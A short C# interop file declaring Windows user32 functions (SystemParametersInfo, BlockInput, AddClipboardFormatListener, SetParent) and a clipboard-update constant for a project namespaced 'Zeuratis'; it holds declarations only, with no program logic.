namespace Zeuratis;

class Native
{
    [DllImport("User32", CharSet = CharSet.Unicode)]
    public static extern int SystemParametersInfo(int uiAction, int uiParam, string pvParam, uint fWinIni);

    [DllImport("user32.dll", EntryPoint = "BlockInput")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

    public const int WM_CLIPBOARDUPDATE = 0x031D;
    public static IntPtr HWND_MESSAGE = new(-3);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool AddClipboardFormatListener(IntPtr hwnd);

    [DllImport("user32.dll", SetLastError = true)]
    public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
}
